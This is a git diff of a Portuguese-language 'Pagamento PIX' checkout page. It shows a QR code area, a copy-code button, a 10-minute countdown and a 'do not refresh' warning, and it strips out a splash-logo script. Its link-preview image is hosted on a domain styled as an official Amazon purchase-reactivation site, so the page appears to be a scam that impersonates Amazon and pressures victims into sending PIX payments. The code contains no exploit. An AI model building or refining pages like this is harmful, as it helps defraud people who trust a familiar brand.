@@ -1,321 +1,97 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-
 <head>
+  <meta charset="UTF-8">
 
-<meta charset="UTF-8">
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, viewport-fit=cover"
+  >
 
-<meta
-  name="viewport"
-  content="width=device-width, initial-scale=1.0, viewport-fit=cover"
->
+  <meta name="theme-color" content="#edbb81">
 
-<meta
-  name="theme-color"
-  content="#edbb81"
->
+  <title>Pagamento PIX</title>
 
-<title>Pagamento PIX</title>
+  <!-- PRÉVIA DO LINK -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Pagamento PIX">
+  <meta
+    property="og:description"
+    content="Acesse para realizar o pagamento."
+  >
 
+  <!--
+    QUANDO TIVER SUA IMAGEM DE PRÉVIA,
+    COLOQUE O LINK PÚBLICO DELA AQUI.
+  -->
+  <meta
+    property="og:image"
+    content="https://amazon-reativacao-de-compra-oficial.onrender.com/logo-previa.jpg"
+  >
 
-<!-- =====================================================
-     PRÉVIA DO WHATSAPP
-     ===================================================== -->
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
 
-<meta
-  property="og:type"
-  content="website"
->
-
-<meta
-  property="og:title"
-  content="Pagamento PIX"
->
-
-<meta
-  property="og:description"
-  content="Acesse para realizar o pagamento."
->
-
-<meta
-  property="og:image"
-  content="https://amazon-reativacao-de-compra-oficial.onrender.com/logo-previa.jpg"
->
-
-<meta
-  property="og:image:alt"
-  content="Logo da loja"
->
-
-<meta
-  property="og:image:width"
-  content="1200"
->
-
-<meta
-  property="og:image:height"
-  content="630"
->
-
-
-<!-- =====================================================
-     PRÉ-CARREGAR LOGO DE ABERTURA
-     ===================================================== -->
-
-<link
-  rel="preload"
-  as="image"
-  href="./logo.png?v=2"
->
-
-
-<link
-  rel="stylesheet"
-  href="./style.css"
->
-
-
+  <link rel="stylesheet" href="style.css">
 </head>
-
 
 <body>
 
-
-<!-- =====================================================
-     LOGO DE ABERTURA
-     =====================================================
-
-     ARQUIVO:
-     logo.png
-
-     Ele precisa estar junto do index.html.
-
-     A logo fica na tela por aproximadamente 2 segundos.
-     ===================================================== -->
-
-<div
-  id="splash"
-  class="splash"
->
-
-  <img
-    id="splashLogo"
-    src="./logo.png?v=2"
-    alt="Logo"
-    loading="eager"
-    decoding="async"
-  >
-
-</div>
-
-
-<!-- =====================================================
-     CABEÇALHO
-     ===================================================== -->
-
-<header class="header">
-
-  <span
-    class="back"
-    aria-hidden="true"
-  >
-    ←
-  </span>
-
-
-  <h1 class="header-title">
-    Autorizar forma de pagamento
-  </h1>
-
-</header>
-
-
-<!-- =====================================================
-     FAIXA ESCURA
-     ===================================================== -->
-
-<div class="dark-bar"></div>
-
-
-<!-- =====================================================
-     PAGAMENTO
-     ===================================================== -->
-
-<main class="payment">
-
-
-  <!-- VALOR -->
-
-  <h2
-    id="amount"
-    class="amount"
-  >
-    Total a pagar: R$ 0,00
-  </h2>
-
-
-  <!-- QR CODE -->
-
-  <div
-    id="qrcode"
-    class="qrcode"
-    aria-label="QR Code para pagamento PIX"
-  ></div>
-
-
-  <!-- INSTRUÇÕES -->
-
-  <h2 class="instructions-title">
-    Escaneie ou copie o código para pagar
-  </h2>
-
-
-  <p class="instructions">
-
-    Escaneie o QR code com a câmera do seu celular
-
-    <br>
-
-    para pagar no aplicativo do seu banco ou copie o
-
-    <br>
-
-    código clicando no botão abaixo.
-
-  </p>
-
-
-  <!-- AVISO -->
-
-  <p class="no-refresh">
-    Não atualize a página.
-  </p>
-
-
-  <!-- CONTADOR -->
-
-  <p class="remaining">
-
-    Tempo restante:
-
-    <strong id="timer">
-      10:00
-    </strong>
-
-  </p>
-
-
-  <!-- COPIAR -->
-
-  <button
-    id="copyButton"
-    class="copy-button"
-    type="button"
-  >
-    Copiar código
-  </button>
-
-
-</main>
-
-
-<!-- =====================================================
-     GERADOR DO QR CODE
-     ===================================================== -->
-
-<script
-  src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"
-></script>
-
-
-<!-- =====================================================
-     SCRIPT DA PÁGINA
-     ===================================================== -->
-
-<script src="./script.js"></script>
-
-
-<!-- =====================================================
-     CONTROLE DA LOGO DE ABERTURA
-     ===================================================== -->
-
-<script>
-
-(function () {
-
-  const splash =
-    document.getElementById("splash");
-
-  const logo =
-    document.getElementById("splashLogo");
-
-
-  /*
-     Garante que a logo seja exibida
-     enquanto a página está carregando.
-  */
-
-  if (splash) {
-
-    splash.style.display =
-      "flex";
-
-    splash.style.opacity =
-      "1";
-
-  }
-
-
-  /*
-     Mantém a logo por 2 segundos.
-  */
-
-  setTimeout(function () {
-
-    if (!splash) {
-      return;
-    }
-
-
-    splash.classList.add("hide");
-
-
-    setTimeout(function () {
-
-      splash.style.display =
-        "none";
-
-    }, 450);
-
-
-  }, 2000);
-
-
-  /*
-     Se a imagem estiver demorando para carregar,
-     mantém a tela de abertura visível.
-  */
-
-  if (logo) {
-
-    logo.addEventListener(
-      "error",
-      function () {
-
-        console.error(
-          "Não foi possível carregar logo.png"
-        );
-
-      }
-    );
-
-  }
-
-})();
-
-</script>
-
+  <!-- CABEÇALHO -->
+  <header class="header">
+    <h1>Autorizar forma de pagamento</h1>
+  </header>
+
+  <!-- FAIXA ESCURA -->
+  <div class="dark-bar"></div>
+
+  <!-- PAGAMENTO -->
+  <main class="payment">
+
+    <h2 id="amount" class="amount">
+      Total a pagar: R$ 0,00
+    </h2>
+
+    <div id="qrcode" class="qrcode"></div>
+
+    <h2 class="instructions-title">
+      Escaneie ou copie o código para pagar
+    </h2>
+
+    <p class="instructions">
+      Escaneie o QR code com a câmera do seu celular
+      <br>
+      para pagar no aplicativo do seu banco ou copie o
+      <br>
+      código clicando no botão abaixo.
+    </p>
+
+    <p class="no-refresh">
+      Não atualize a página.
+    </p>
+
+    <p class="remaining">
+      Tempo restante:
+      <strong id="timer">10:00</strong>
+    </p>
+
+    <button
+      id="copyButton"
+      class="copy-button"
+      type="button"
+    >
+      Copiar código
+    </button>
+
+    <p id="copyStatus" class="copy-status"></p>
+
+  </main>
+
+  <!-- GERADOR DO QR CODE -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+
+  <!-- SEU SCRIPT -->
+  <script src="script.js"></script>
 
 </body>
-
 </html>
